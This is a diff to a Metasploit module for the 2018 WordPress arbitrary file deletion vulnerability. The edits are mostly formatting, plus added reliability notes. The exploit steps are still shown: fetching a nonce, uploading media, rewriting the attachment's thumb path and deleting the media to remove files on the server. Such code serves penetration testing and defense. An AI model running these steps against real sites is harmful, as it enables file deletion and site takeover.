@@ -7,33 +7,38 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HTTP::Wordpress
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name'           => 'Wordpress Arbitrary File Deletion',
-      'Description'    => %q(
-        An arbitrary file deletion vulnerability in the WordPress core allows any user with privileges of an
-        Author to completely take over the WordPress site and to execute arbitrary code on the server.
-      ),
-      'Author'         =>
-          [
-            'Slavco Mihajloski',   # Vulnerability discovery
-            'Karim El Ouerghemmi', # Vulnerability discovery
-            'Aloïs Thévenot'       # Metasploit module
-          ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-          [
-            ['WPVDB', '9100'],
-            ['EDB', '44949'],
-            ['PACKETSTORM', '148333'],
-            ['URL', 'https://blog.sonarsource.com/wordpress-file-delete-to-code-execution/'],
-            ['URL', 'https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/']
-          ],
-      'Privileged'     => false,
-      'Platform'       => 'php',
-      'Arch'           => ARCH_PHP,
-      'DisclosureDate' => '2018-06-26'
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Wordpress Arbitrary File Deletion',
+        'Description' => %q{
+          An arbitrary file deletion vulnerability in the WordPress core allows any user with privileges of an
+          Author to completely take over the WordPress site and to execute arbitrary code on the server.
+        },
+        'Author' => [
+          'Slavco Mihajloski', # Vulnerability discovery
+          'Karim El Ouerghemmi', # Vulnerability discovery
+          'Aloïs Thévenot'       # Metasploit module
+        ],
+        'License' => MSF_LICENSE,
+        'References' => [
+          ['WPVDB', '9100'],
+          ['EDB', '44949'],
+          ['PACKETSTORM', '148333'],
+          ['URL', 'https://blog.sonarsource.com/wordpress-file-delete-to-code-execution/'],
+          ['URL', 'https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/']
+        ],
+        'Privileged' => false,
+        'Platform' => 'php',
+        'Arch' => ARCH_PHP,
+        'DisclosureDate' => '2018-06-26',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -54,9 +59,9 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_nonce(cookie)
     res = send_request_cgi(
-      'method'  => 'GET',
-      'uri'     => normalize_uri(wordpress_url_backend, 'upload.php'),
-      'cookie'  => cookie
+      'method' => 'GET',
+      'uri' => normalize_uri(wordpress_url_backend, 'upload.php'),
+      'cookie' => cookie
     )
 
     unless res && (res.code == 200)
@@ -90,11 +95,11 @@ class MetasploitModule < Msf::Auxiliary
     post_data = data.to_s
 
     res = send_request_cgi(
-      'method'  => 'POST',
-      'uri'     => normalize_uri(wordpress_url_backend, 'async-upload.php'),
-      'ctype'   => "multipart/form-data; boundary=#{data.bound}",
-      'data'    => post_data,
-      'cookie'  => cookie
+      'method' => 'POST',
+      'uri' => normalize_uri(wordpress_url_backend, 'async-upload.php'),
+      'ctype' => "multipart/form-data; boundary=#{data.bound}",
+      'data' => post_data,
+      'cookie' => cookie
     )
 
     unless res && (res.code == 200)
@@ -108,9 +113,9 @@ class MetasploitModule < Msf::Auxiliary
 
     vprint_status('Editing thumb path...')
     res = send_request_cgi(
-      'method'  => 'POST',
-      'uri'     => normalize_uri(wordpress_url_backend, "post.php?post=#{id}"),
-      'cookie'  => cookie,
+      'method' => 'POST',
+      'uri' => normalize_uri(wordpress_url_backend, "post.php?post=#{id}"),
+      'cookie' => cookie,
       'vars_post' =>
           {
             'action' => 'editattachment',
@@ -125,9 +130,9 @@ class MetasploitModule < Msf::Auxiliary
 
     vprint_status('Deleting media...')
     res = send_request_cgi(
-      'method'  => 'POST',
-      'uri'     => normalize_uri(wordpress_url_backend, 'admin-ajax.php'),
-      'cookie'  => cookie,
+      'method' => 'POST',
+      'uri' => normalize_uri(wordpress_url_backend, 'admin-ajax.php'),
+      'cookie' => cookie,
       'vars_post' =>
           {
             'action' => 'delete-post',
